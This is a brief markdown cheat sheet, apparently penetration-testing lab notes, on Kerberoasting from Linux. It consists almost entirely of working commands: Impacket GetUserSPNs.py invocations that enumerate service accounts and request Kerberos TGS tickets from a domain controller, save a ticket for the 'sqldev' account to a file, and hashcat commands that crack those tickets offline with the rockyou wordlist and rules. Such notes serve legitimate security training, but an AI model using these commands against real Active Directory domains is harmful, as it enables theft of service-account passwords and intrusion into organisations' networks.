# Kerberoasting - from Linux

### **Kerberoasting with GetUserSPNs.py**

```markdown
GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend
```

### **Requesting all TGS Tickets**

```markdown
GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request 
```

### **Requesting a Single TGS ticket**

```markdown
GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request-user sqldev
```

### **Saving the TGS Ticket to an Output File**

```markdown
 GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request-user sqldev -outputfile sqldev_tgs

```

### **Cracking the Ticket Offline with Hashcat**

```markdown
hashcat -m 13100 sqldev_tgs /usr/share/wordlists/rockyou.txt 
```

### 

```markdown
sudo impacket-GetUserSPNs -request -dc-ip 192.168.50.70 corp.com/pete
sudo hashcat -m 13100 hashes.kerberoast2 /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
```